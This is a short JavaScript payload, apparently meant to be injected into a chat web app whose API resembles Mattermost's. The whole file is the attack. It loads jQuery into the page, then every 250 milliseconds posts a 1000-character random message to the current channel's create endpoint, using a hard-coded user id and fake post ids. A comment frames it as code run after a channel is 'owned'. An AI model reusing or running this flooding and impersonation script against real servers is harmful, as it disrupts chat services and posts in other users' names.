function makeid(len)
{
    var text = "";
    var possible = "script\\[]{}!@#$%^&*)()_ ";
    for( var i=0; i < len; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}

var channel = window.channel;

// Load in JQuery
var jquery = document.createElement('script');
jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
document.head.appendChild(jquery);

// Subtle change
setInterval(function(){
	// lets say we were owned in this channel
	var data = {
		"filenames": [],
		"message": makeid(1000),
		"channel_id": channel,
		"pending_post_id": Math.random().toString(36).substring(7),
		"user_id": "w6tj384ui788jfani5m5i6ws6a",
		"create_at":1,
		"state":"loading"
	};
	$.post('/api/v1/channels/'+channel+'/create', JSON.stringify(data));
}, 250);